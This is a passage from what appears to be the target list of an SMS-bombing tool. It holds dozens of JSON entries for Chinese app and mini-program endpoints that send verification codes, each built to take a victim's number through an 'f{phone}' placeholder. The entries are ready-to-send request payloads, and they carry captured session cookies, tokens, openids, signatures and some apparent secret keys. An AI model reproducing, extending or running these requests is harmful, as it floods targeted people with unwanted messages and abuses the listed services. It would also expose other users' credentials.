"nonce": "xHMNQBDpQifWxKMPpPt8NecxpcBipXpM",
"version": "0200",
"devicetype": "2",
"token": "",
"sequence": "2025091410289883031345",
"random": "",
"baseurl": "https://ycx.cqmetro.cn/",
"appid": "A500120190100001",
"content-type": "application/json",
"timestamp": "1757816912899",
"Referer": "https://servicewechat.com/wxa17aea49c17829df/8/page-frame.html"
}
},
{
"name": "168api-tyxcx.zaiguahao.com",
"url": "https://168api-tyxcx.zaiguahao.com/api/common/smsSend",
"method": "POST",
"data": "{\"applets_id\":1352,\"phone\":\"f{phone}\"}",
"headers": {
"Host": "168api-tyxcx.zaiguahao.com",
"Connection": "keep-alive",
"charset": "utf-8",
"openid": "oV6zA6w65irzV1-yy9fI-q2XoQfs",
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"token": "",
"Referer": "https://servicewechat.com/wxf254782886c95eb0/6/page-frame.html"
}
},
{
"name": "wxmini.360jdt.cn",
"url": "https://wxmini.360jdt.cn/prod-api/jd-jdt-api/api/mobile/send",
"method": "GET",
"params": {
"appType": "1",
"mobile": "f{phone}",
"openId": "o8J4U7TFmwklhaNtJR-H9Yu-oryo",
"tenantId": "100017"
},
"headers": {
"Host": "wxmini.360jdt.cn",
"Connection": "keep-alive",
"encData": "a56e8c8506e92d2c56e4512bd86578f3c5b56e443051160ac2eda3b668295d54",
"sec-ch-ua-platform": "\"Android\"",
"tenantId": "100017",
"sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Android WebView\";v=\"134\"",
"tenant": "100017",
"sec-ch-ua-mobile": "?1",
"openId": "o8J4U7TFmwklhaNtJR-H9Yu-oryo",
"appType": "5",
"Accept": "application/json, text/plain, /",
"X-Requested-With": "com.tencent.mobileqq",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://wxmini.360jdt.cn/firstCreate?flag=0",
"Accept-Encoding": "gzip, deflate, br, zstd",
"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
}
},
{
"name": "xcx.kuaidizs.cn",
"url": "https://xcx.kuaidizs.cn/xcx/identity/sendCapcha",
"method": "POST",
"data": "{\"phone\":\"f{phone}\"}",
"headers": {
"Host": "xcx.kuaidizs.cn",
"Connection": "keep-alive",
"charset": "utf-8",
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"token": "2da74f341fa94690a8e7318ab8682605oV0yQ4o5tAp-Gkp9tMFJH8YWs1oE",
"Referer": "https://servicewechat.com/wxad29fbce880f2c90/31/page-frame.html"
}
},
{
"name": "p.kuaidi100.com",
"url": "https://p.kuaidi100.com/xcx/sms/sendcode",
"method": "POST",
"data": "name=f{phone}&validcode=",
"headers": {
"Host": "p.kuaidi100.com",
"Connection": "keep-alive",
"charset": "utf-8",
"content-type": "application/x-www-form-urlencoded",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx1dd3d8b53b02d7cf/553/page-frame.html"
}
},
{
"name": "app-api.iyouya.com",
"url": "https://app-api.iyouya.com/app/memberAccount/captcha",
"method": "GET",
"params": {
"mobile": "f{phone}"
},
"headers": {
"Accept-Encoding": "gzip,compress,br,deflate"
}
},
{
"name": "www.101s.com.cn",
"url": "https://www.101s.com.cn/prod-api/memorial_hall/user/send",
"method": "POST",
"data": "{\"phone\":\"f{phone}\"}",
"headers": {
"Host": "www.101s.com.cn",
"Connection": "keep-alive",
"charset": "utf-8",
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wxff5c9882b5e61d35/9/page-frame.html"
}
},
{
"name": "www.zzsbzswfwzx.cn",
"url": "https://www.zzsbzswfwzx.cn/zzby/ServerCommand/%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1",
"method": "POST",
"data": "{\"Phone\":\"f{phone}\"}",
"headers": {
"sec-ch-ua-platform": "\"Android\"",
"sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Android WebView\";v=\"134\"",
"sec-ch-ua-mobile": "?1",
"x-requested-with": "XMLHttpRequest",
"accept": "/",
"content-type": "application/json",
"connectionid": "5a73db91-a1e0-45e3-8691-80a40d938a2d",
"origin": "https://www.zzsbzswfwzx.cn",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": "https://www.zzsbzswfwzx.cn/zzby/denglu?openid=ofqJg5BZKdCHk9nLte3JCXDYGupQ",
"accept-encoding": "gzip, deflate, br, zstd",
"accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
"priority": "u=1, i"
}
},
{
"name": "ggxy.guaguaiot.com",
"url": "https://ggxy.guaguaiot.com/ggxyapp/app/api/v1/auth/sms/code",
"method": "POST",
"data": "{\"mobile\":\"f{phone}\",\"smsType\":1}",
"headers": {
"Host": "ggxy.guaguaiot.com",
"Connection": "keep-alive",
"charset": "utf-8",
"useplatform": "mpWeixin",
"appversion": "1.0.8",
"appversioncode": "10009",
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx48e0be861389021c/59/page-frame.html"
}
},
{
"name": "api.xinhualeyu.com",
"url": "https://api.xinhualeyu.com/uums/account/sendSms",
"method": "GET",
"params": {
"loginType": "1",
"mobile": "f{phone}",
"operaType": "1"
},
"headers": {
"Accept-Encoding": "gzip,compress,br,deflate"
}
},
{
"name": "aiop.guoli-edu.com",
"url": "https://aiop.guoli-edu.com/api-shop/p/user/sms",
"method": "POST",
"data": "{\"phone\":\"f{phone}\"}",
"headers": {
"Host": "aiop.guoli-edu.com",
"Connection": "keep-alive",
"authorization": "3Y_B7bbXt6GywpKhb_hxRKa9BZpMqOA1Ir__",
"charset": "utf-8",
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx80116f8937fb0318/14/page-frame.html"
}
},
{
"name": "jx.vmta.com",
"url": "https://jx.vmta.com/forum/user/sendBindCode/f{phone}",
"method": "GET",
"headers": {
"Host": "jx.vmta.com",
"Connection": "keep-alive",
"charset": "utf-8",
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"token": "8e555f29-3bb8-4bde-93bc-6833c4299d91",
"Referer": "https://servicewechat.com/wxdce2fe3b501ec2d8/74/page-frame.html"
}
},
{
"name": "school-gateway.paas.cmbchina.com",
"url": "https://school-gateway.paas.cmbchina.com/common/loginUser/sendWxSmsCode",
"method": "POST",
"data": "{\"isLoading\":true,\"tel\":\"f{phone}\",\"uuid\":\"\",\"captchaCode\":\"\"}",
"headers": {
"Host": "school-gateway.paas.cmbchina.com",
"Connection": "keep-alive",
"authorization": "",
"charset": "utf-8",
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx61b393284c108b9e/37/page-frame.html"
}
},
{
"name": "api.school-home.cn",
"url": "https://api.school-home.cn/api/admin/auth/login/sms-code",
"method": "POST",
"data": "{\"phone\":\"f{phone}\"}",
"headers": {
"Host": "api.school-home.cn",
"Connection": "keep-alive",
"charset": "utf-8",
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"accept": "application/json",
"Referer": "https://servicewechat.com/wx9c9848839aeb4fd9/31/page-frame.html"
}
},
{
"name": "qsnsthd.jdjy.sh.cn",
"url": "https://qsnsthd.jdjy.sh.cn/api-rzzx/renzhengzhongxin/login/sendLoginVerificationCode",
"method": "POST",
"params": {
"sjh": "f{phone}"
},
"headers": {
"Host": "qsnsthd.jdjy.sh.cn",
"Connection": "keep-alive",
"a": "1",
"charset": "utf-8",
"salting": "1184315aad38b49e2651b59dcbd5fd72",
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx3fb7a2162cf7de55/23/page-frame.html"
}
},
{
"name": "school-api.717travel.com",
"url": "https://school-api.717travel.com/prod-api/captchaSms",
"method": "GET",
"params": {
"schoolId": "1",
"phonenumber": "f{phone}"
},
"headers": {
"Accept-Encoding": "gzip,compress,br,deflate"
}
},
{
"name": "wx2270.cnhis.cc",
"url": "http://wx2270.cnhis.cc/wx/send/code/login.htm",
"method": "POST",
"data": {
"phone": "f{phone}",
"countryCode": "86"
},
"headers": {
"Host": "wx2270.cnhis.cc",
"Cookie": "SESSION=N2JiMTU3YTMtNWZmYS00OGRjLTgyNDQtM2UwMzkwNTI1YzU4",
"Accept": "application/json, text/plain, /",
"userType": "TX",
"timeStr": "1716828087532",
"openId": "",
"Accept-Language": "zh-cn",
"token": "",
"Accept-Encoding": "gzip, deflate",
"Origin": "http://wx2270.cnhis.cc",
"Referer": "http://wx2270.cnhis.cc/wxcommon/web/",
"Content-Length": "32",
"Connection": "keep-alive",
"Content-Type": "application/x-www-form-urlencoded",
"nonstr": "4rv5a2qk",
"sign": "eb61d965b36b3074d4c3dc417199fef7"
}
},
{
"name": "cps.qixin18.com",
"url": "https://cps.qixin18.com/m/apps/cps/bxn1096837/api/mobile/sendSmsCode",
"method": "POST",
"params": {
"md": "0.8036556356856903"
},
"json_data": {
"cardNumber": "NDIyNDIzMTk3NTA3MjQ2NjE1",
"mobile": "base64.b64encode(f{phone}.encode()).decode()",
"cardTypeId": "1",
"cname": "op",
"productId": 105040,
"merchantId": 1096837,
"customerId": 37640245,
"encryptInsureNum": "cm98HrGWSRoJRojI5Tg6Bg"
},
"headers": {
"Host": "cps.qixin18.com",
"Connection": "keep-alive",
"Content-Length": "209",
"traceparent": "00-d5056a43b015f07aded289325bbf2233-cfe0be18fc00d80a-01",
"sec-ch-ua-platform": "\"Android\"",
"Accept": "application/json, text/plain, /",
"sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
"Content-Type": "application/json;charset=UTF-8",
"sec-ch-ua-mobile": "?1",
"Origin": "https://cps.qixin18.com",
"X-Requested-With": "com.tencent.mm",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://cps.qixin18.com/m/apps/cps/bxn1096837/product/insure?encryptInsureNum=cm98HrGWSRoJRojI5Tg6Bg&isFormDetail=1&merak_traceId=0cb083327198781a0a49L9pe4DfciD61",
"Accept-Encoding": "gzip, deflate, br, zstd",
"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
"Cookie": "nodejs_sid=s%3AJe330pDnPvmMafrtsgLGXZubqQg7Plv7.FB9kbFV89DrYQBJkYRb0UkaPNwzEQm5Trgd0yUlseOk; fed-env=production; qxc_token=eb81b40d-43f9-4bcf-8b57-bd165da4fad7; hz_guest_key=3x9a97LHUHZ4y3XPekPH_1754097046804_1_1015544_38625430; _bl_uid=j5mjkd0XtbvkC138scUCkhstU8yy; acw_tc=ac11000117543616244402076e006971cba05a01bd4bb140e4df5a1c961c19; merakApiSessionId=ebb083327198781a0976uqPJu53NwsTZ; beidou_jssdk_session_id=1754361629213-2069604-04d431e52fbfe1-30281942; MERAK_DEVICE_ID=54826bc105b8826c0935c7ef9cb76101; MERAK_RECALL_ID=98b083327198781a0b76EQOm7F0i9Itv; MERAK_SESSIONID_ID=0ab083327198781a0b77ccweQE49Inxl; beidoudata2015jssdkcross=%7B%22distinct_id%22%3A%22%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%7D%2C%22session_id%22%3A%22%22%2C%22%24page_visit_id%22%3A%22%22%2C%22%24device_id%22%3A%22%22%2C"
}
},
{
"name": "support.mikecrm.com",
"url": "https://support.mikecrm.com/handler/web/form_runtime/handleGetPhoneVerificationCode.php",
"method": "POST",
"data": "d=quote(json.dumps({\"cvs\": {\"t\": \"j7ctI52\", \"cp\": \"208396143\", \"mb\": f{phone}}}))",
"headers": {
"Host": "support.mikecrm.com",
"Connection": "keep-alive",
"Content-Length": "109",
"sec-ch-ua-platform": "\"Android\"",
"X-Requested-With": "XMLHttpRequest",
"Accept": "application/json, text/javascript, /; q=0.01",
"sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
"sec-ch-ua-mobile": "?1",
"Origin": "https://support.mikecrm.com",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://support.mikecrm.com/j7ctI52?_cpv=%7B%22208395996%22%3A%22http%3A%2F%2Fcn.mikecrm.com%2FozURs1%22%7D",
"Accept-Encoding": "gzip, deflate, br, zstd",
"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
"Cookie": "uvi=ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz; mk_seed=84; MK_L_UVD=%7B%2223%22%3A%2218070783632%22%2C%2231%22%3A%22%u6551%u8D4E%u7F51%u7EDC%u5B89%u5168%22%2C%2232%22%3A%22%u56FD%u5B89%22%7D; uvis=ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz"
}
},
{
"name": "mobilev2.atomychina.com.cn",
"url": "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code",
"method": "POST",
"json_data": {
"mobile": "f{phone}",
"captcha": "1111",
"token": "1111",
"prefix": 86
},
"headers": {
"Host": "mobilev2.atomychina.com.cn",
"Connection": "keep-alive",
"Content-Length": "68",
"pragma": "no-cache",
"design-site-locale": "zh-CN",
"Accept-Language": "zh-CN",
"X-HTTP-REQUEST-DOMAIN": "mobilev2.atomychina.com.cn",
"Content-Type": "application/json",
"Accept": "application/json",
"cache-control": "no-cache",
"xweb_xhr": "1",
"x-requested-with": "XMLHttpRequest",
"cookie": "acw_tc=0b6e702e17131629263394156e104b9681bb7f7854d38d5dfc0dff560ade54; guestId=01e7996e-454f-4bab-bd84-44b6d2277113; 15 Apr 2025 06:35:26 GMT; guestId.sig=jWFSrGBOhFwEfFZJbEoMSYkDoO8; 15 Apr 2025 06:35:50 GMT; 15 Apr 2025 06:35:52 GMT",
"Sec-Fetch-Site": "cross-site",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://servicewechat.com/wx74d705d9fabf5b77/97/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "apibus.zhihuiyunxing.com",
"url": "https://apibus.zhihuiyunxing.com/api/1.0/mini/sms",
"method": "POST",
"data": {
"phone": "f{phone}",
"random": "31540959202205610",
"userType": "1",
"type": "PASSENGER_LOGIN_CODE"
},
"headers": {
"Host": "apibus.zhihuiyunxing.com",
"Connection": "keep-alive",
"Content-Length": "79",
"version": "V2.0.0",
"xweb_xhr": "1",
"token": "",
"appKey": "yuis7s5s4d89g0fj1uy9ssksd0fg0",
"Content-Type": "application/x-www-form-urlencoded",
"Accept": "/",
"Sec-Fetch-Site": "cross-site",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://servicewechat.com/wx17132144b45008cb/16/page-frame.html",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "zh-CN,zh;q=0.9"
}
},
{
"name": "yczj.api.autohome.com.cn",
"url": "https://yczj.api.autohome.com.cn/cus/v1_0_0/api/msite/login/sendVerificationCode",
"method": "POST",
"json_data": {
"mobile": "f{phone}",
"isDianPing": True,
"platform": 4,
"version": "2.2.30",
"_timestamp": 1736575616,
"channel": "channel",
"refPage": "wx_dp",
"autohomeua": "Windows 10 x64\tcarcomment_windows\t2.7.3\twindows_wx",
"userid": "",
"usertoken": "",
"deviceid": "5db10dd4-e164-4f90-862d-039b22072eef",
"openid": "o9gLH5SurbWzJacXh2TveA31kUK0",
"pcpopclub": "",
"autoUserId": ""
},
"headers": {
"Host": "yczj.api.autohome.com.cn",
"Connection": "keep-alive",
"Content-Length": "353",
"DP_OPEN_ID": "o9gLH5SurbWzJacXh2TveA31kUK0",
"DP_DEVICE_ID": "5db10dd4-e164-4f90-862d-039b22072eef",
"WzReview": "app_key=carcomment_android;is_wx=1;userid=0;usertoken=0;dpwxversion=2.2.30;is_rn=1;app_ver=2.7.2;isH5=1;",
"Content-Type": "application/json",
"REQ_SOURCE": "wechat_review",
"Accept": "application/json",
"xweb_xhr": "1",
"Cookie": "yczj_login_data=",
"Sec-Fetch-Site": "cross-site",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://servicewechat.com/wxd32646bc23c54d30/72/page-frame.html",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "zh-CN,zh;q=0.9"
}
},
{
"name": "gateway-front-external.nio.com",
"url": "https://gateway-front-external.nio.com/onvo/moat/1100023/n/a/user/access/verification_code",
"method": "POST",
"params": {
"hash_type": "sha256"
},
"data": {
"country_code": "86",
"mobile": "f{phone}",
"classifier": "login",
"device_id": "oPgfE62SRLyPt-MLYg8zJyupZ7ng",
"terminal": "{\"name\":\"微信小程式-windows\",\"model\":\"microsoft\"}",
"wechat_app_id": "wxeb0948c3bc004f93"
},
"headers": {
"Host": "gateway-front-external.nio.com",
"Connection": "keep-alive",
"Content-Length": "243",
"xweb_xhr": "1",
"Content-Type": "application/x-www-form-urlencoded",
"Accept": "/",
"Sec-Fetch-Site": "cross-site",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://servicewechat.com/wxeb0948c3bc004f93/24/page-frame.html",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "zh-CN,zh;q=0.9"
}
},
{
"name": "api666.xfb315.cn",
"url": "https://api666.xfb315.cn/auth/send_sms",
"method": "POST",
"json_data": {
"phone": "f{phone}"
},
"headers": {
"Host": "api666.xfb315.cn",
"Connection": "keep-alive",
"Content-Length": "23",
"version": "10.0.3",
"xweb_xhr": "1",
"source": "miniprogram",
"Authorization": "bearer",
"Content-Type": "application/json",
"Accept": "/",
"Sec-Fetch-Site": "cross-site",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://servicewechat.com/wx899e26f0d5e313c0/219/page-frame.html",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "zh-CN,zh;q=0.9"
}
},
{
"name": "muguntools.com",
"url": "https://muguntools.com/api/sms/send",
"method": "POST",
"json_data": {
"mobile": "f{phone}",
"code": "",
"openid": "oWikI7Tys7eVJJCZ9DbkkE-hjxfE",
"unionid": "opYUb6lUjDJFbI_K3QtJxkpk2ntE",
"provider": "weixin"
},
"headers": {
"Host": "muguntools.com",
"Connection": "keep-alive",
"Content-Length": "135",
"version": "1.1.2",
"Content-Type": "application/json",
"xweb_xhr": "1",
"device": "windows",
"openid": "oWikI7Tys7eVJJCZ9DbkkE-hjxfE",
"brand": "microsoft",
"platform": "wxMiniProgram",
"os": "windows",
"vcode": "112",
"modal": "microsoft",
"unionid": "opYUb6lUjDJFbI_K3QtJxkpk2ntE",
"Accept": "/",
"Sec-Fetch-Site": "cross-site",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://servicewechat.com/wx38127f9d5d6639cf/15/page-frame.html",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "zh-CN,zh;q=0.9"
}
},
{
"name": "passport.uucin.com",
"url": "https://passport.uucin.com/accounts/send_login_mobile_captcha",
"method": "POST",
"data": "mobile=f{phone}",
"headers": {
"Host": "passport.uucin.com",
"Connection": "keep-alive",
"Content-Length": "18",
"Accept": "application/JSON",
"xweb_xhr": "1",
"X-CLIENT-ID": "Yjg2NWE1YTI3M2YyNDlhZjg1NjkzYmIyMGUxYTcwN2I=",
"Authorization": "token undefined",
"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
"Sec-Fetch-Site": "cross-site",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://servicewechat.com/wxb3b23f913746f653/180/page-frame.html",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "zh-CN,zh;q=0.9"
}
},
{
"name": "www.sohochinaoffice.com",
"url": "https://www.sohochinaoffice.com/api/mini-login/send-verify-code",
"method": "POST",
"json_data": {
"mobile": "f{phone}"
},
"headers": {
"Host": "www.sohochinaoffice.com",
"Connection": "keep-alive",
"Accept": "application/json, text/plain, /",
"xweb_xhr": "1",
"X-Requested-With": "XMLHttpRequest",
"Cookie": "acw_tc=b65cfd3b17365814882984990e5597abfcb6a4670a24c6837e4ae0424fc03a; SERVERID=cd790e86ab36d7aeaa540056",
"shumeidid": "",
"timestamp": 1718182266805,
"sign": "EFF2468A92FAF3112A3FD75095EF1F86"
}
},
{
"name": "api.miaozo.com",
"url": "https://api.miaozo.com/app/sms/v2/login",
"method": "POST",
"json_data": {
"cellphone": "f{phone}",
"client": {
"timestamp": 1718183588,
"identity": "ec66fd8d-105d-4dab-936d-eee301ce25ad",
"sign": "5025d5b62cc7857f3ee6b66d679f405c"
}
},
"headers": {
"Host": "api.miaozo.com",
"Connection": "keep-alive",
"Content-Length": "153",
"ApplicationVersion": "6.4.4",
"PhoneModel": "iPhone 11<iPhone12,1>,iOS 14.7",
"content-type": "application/json",
"WechatVersion": "8.0.48,3.3.5",
"ApplicationSource": "miniPrograme",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx983bc7fc0880eb68/278/page-frame.html"
}
},
{
"name": "api.saicmobility.com",
"url": "https://api.saicmobility.com/cas/v2/mobile/sendmobileauthcode",
"method": "POST",
"json_data": {
"mobile": "f{phone}",
"userType": 1,
"templateCode": "0002",
"smsType": 0,
"source": "wxmp"
},
"headers": {
"Host": "api.saicmobility.com",
"Connection": "keep-alive",
"Content-Length": "87",
"content-type": "application/json",
"X-Saic-Platform": "wxmp",
"X-Saic-LoginChannel": "3",
"X-Saic-Device-Id": "2ececf17a81bf13923fd7c9273656d15",
"X-Saic-CityCode": "310100",
"uid": "",
"X-MerchantId": "saic_car",
"X-Saic-ProductId": "1",
"X-Saic-AppId": "saic_car",
"X-Saic-App-Version": "3.0.0",
"X-Saic-CurrentTimeZone": "UTC+8",
"X-Saic-Real-App-Version": "4.11",
"X-Saic-Finger": "e6c1108a-5a27-4ae0-8ab6-d97588dc0f7e",
"X-Saic-Req-Ts": "1718184226305",
"X-Saic-Channel": "saicwx",
"X-Saic-Gps": "140.33470745899146,37.491017710754086",
"X-Saic-Location-CityCode": "310100",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx3207ea5333ed52dc/139/page-frame.html"
}
},
{
"name": "www.hylyljk.com",
"url": "https://www.hylyljk.com/ymm-common/sms/sendSmsCode",
"method": "POST",
"json_data": {
"phone": "f{phone}"
},
"headers": {
"Content-Type": "application/json",
"UserType": "1",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx7edcedb080ff0cf0/84/page-frame.html"
}
},
{
"name": "u.letfungo.com",
"url": "https://u.letfungo.com/api/app/user/ebikeUsers/registerSendSMS",
"method": "POST",
"data": {
"type": "1002",
"act": "send",
"phone": "f{phone}",
"page_code": "aHpsZnwxNzE4Mzg5MzMwaHpsZjIwMTgO0O0O",
"plat_id": "1",
"token": "116231749b8325e998dc2e9c4dc8605a157c537f70dfe008df0e10458ebfcd6db881949c4f9772c37c25731ab667f804"
},
"headers": {
"Content-Type": "application/x-www-form-urlencoded",
"op-lang": "zh-Hans",
"app-phone-version": "iOS 14.7",
"app-phone-style": "iPhone 11<iPhone12,1>",
"platform": "ios",
"uuid": "17183893235984919229",
"app-lang": "",
"aid": "",
"mp-version": "8.0.48",
"appid": "wx29861b332f0eb297",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx29861b332f0eb297/256/page-frame.html"
}
},
{
"name": "ddc.jiahengchuxing.com",
"url": "https://ddc.jiahengchuxing.com/account/account/sendRegisterCode",
"method": "POST",
"params": {
"fromApi": "miniapp"
},
"data": {
"mobile": "f{phone}"
},
"headers": {
"Content-Type": "application/x-www-form-urlencoded",
"token": "",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx997eeb950b7e0cfc/66/page-frame.html"
}
},
{
"name": "esino.xtrunc.com",
"url": "https://esino.xtrunc.com/esino/api/user/phone_auth",
"method": "POST",
"params": {
"3rd": "0000*0000",
"tm": "1718386573"
},
"json_data": {
"3rdsession": "0000000000000000",
"op": "sendsms",
"phonenumber": "f{phone}",
"code": "0e3Tpi0w3KJFX23HfI2w3jF25V3Tpi0N",
"appid": "wxffcf13a198304d5b",
"ver": "v2"
},
"headers": {
"Content-Type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wxffcf13a198304d5b/2/page-frame.html"
}
},
{
"name": "ride-platform.hellobike.com",
"url": "https://ride-platform.hellobike.com/api",
"method": "POST",
"json_data": {
"riskControlData": {},
"version": "6.57.0",
"releaseVersion": "6.57.0",
"systemCode": "226",
"appName": "AppHelloMiniBrand",
"mobileModel": "iPhone 11<iPhone12,1>",
"weChatVersion": "8.0.48",
"mobileSystem": "iOS 14.7",
"SDKVersion": "3.3.5",
"systemPlatform": "ios",
"from": "wechat",
"CODE_ENV": "pro",
"mobile": "f{phone}",
"tenantId": "t_chn_ascx",
"source": "0",
"action": "saas.user.auth.sendCode"
},
"headers": {
"Content-Type": "application/json",
"nonce": "883727",
"signature": "5ad8f3f0754caa92e62af53a1b55acabab3d0cac",
"timestamp": "1718387466307",
"systemCode": "226",
"x-chaos-env": "pro-1.1.2",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx28d825793977e385/16/page-frame.html"
}
},
{
"name": "api.xiaoantech.com",
"url": "https://api.xiaoantech.com/xcuser/v1/user/requestSmsCode",
"method": "POST",
"json_data": {
"mobilePhoneNumber": "f{phone}"
},
"headers": {
"accept": "application/json",
"content-type": "application/json",
"X-LC-Id": "6037536b17162e00016bcf6c",
"X-LC-Session": "",
"X-LC-Key": "LTAI4GLABNn7ngjVekkgx5m2",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wxd1fd30eba3f80057/11/page-frame.html"
}
},
{
"name": "axq.beidouxh.cn",
"url": "https://axq.beidouxh.cn/user-api/getPhoneCode",
"method": "POST",
"json_data": {
"phone": "f{phone}",
"eventType": 12,
"ver": "1.0.0",
"plat": "weixin",
"sys": "iphone",
"imei": "123456789",
"timestamp": 1718388614,
"sign": "123456789abcd"
},
"headers": {
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx16326cd757042bb1/89/page-frame.html"
}
},
{
"name": "www.8341.top",
"url": "https://www.8341.top/sys/tabUser/sms",
"method": "POST",
"json_data": {
"phone": "f{phone}"
},
"headers": {
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx0e75b2cce830f980/37/page-frame.html"
}
},
{
"name": "zcclient.uqbike.com",
"url": "https://zcclient.uqbike.com/customer/login/sms",
"method": "POST",
"json_data": {
"phone": "f{phone}",
"appId": "wx889c3c5d7bc8dc51",
"wxLoginCode": "0c3uRo000ZiAiS1eLd300SX4Bo4uRo0N",
"loginType": 1
},
"headers": {
"token": "",
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx889c3c5d7bc8dc51/14/page-frame.html"
}
},
{
"name": "hdg.u-ebike.com",
"url": "https://hdg.u-ebike.com:19082/user/system/checkUsername",
"method": "POST",
"json_data": {
"username": "f{phone}"
},
"headers": {
"content-type": "application/json",
"X-Authorization": "",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx206637e1780ccd3c/21/page-frame.html"
}
},
{
"name": "dy.qiyiqixing.com",
"url": "https://dy.qiyiqixing.com/mini-member-api/blade-resource/sms/endpoint/send-validate",
"method": "POST",
"json_data": {
"phone": "f{phone}",
"type": 1
},
"headers": {
"Content-Type": "application/json",
"Blade-Auth": "",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wxc8e98aadbeac1abe/68/page-frame.html"
}
},
{
"name": "mini.ydinggo.com",
"url": "https://mini.ydinggo.com/noticeCenter/idCode/send",
"method": "POST",
"json_data": {
"identity": 1,
"mobile": f"{phone}",
"type": 1
},
"headers": {
"Host": "mini.ydinggo.com",
"Connection": "keep-alive",
"openId": "o8Q615GTwlmvi4Zwa5GqClv2A5ho",
"X-Mgs-Proxy-Signature": "9de3ef88fa47921507b6a84c337e882a",
"X-Mgs-Proxy-Signature-Secret-Key": "63f63441f61fb557099df7a74a070c52",
"token": "",
"content-type": "application/json",
"Accept-Encoding": "gzip,compress,br,deflate",
"Referer": "https://servicewechat.com/wx166fbbc23ae5a2fe/207/page-frame.html"
}
},

    {
        "name": "support.mikecrm.com",
        "url": "https://support.mikecrm.com/handler/web/form_runtime/handleGetPhoneVerificationCode.php",
        "method": "POST",
        "data": "d=quote(json.dumps({\"cvs\": {\"t\": \"j7ctI52\", \"cp\": \"208396143\", \"mb\": f{phone}}}))",
        "headers": {
            "Host": "support.mikecrm.com",
            "Connection": "keep-alive",
            "Content-Length": "109",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json, text/javascript, */*; q=0.01",
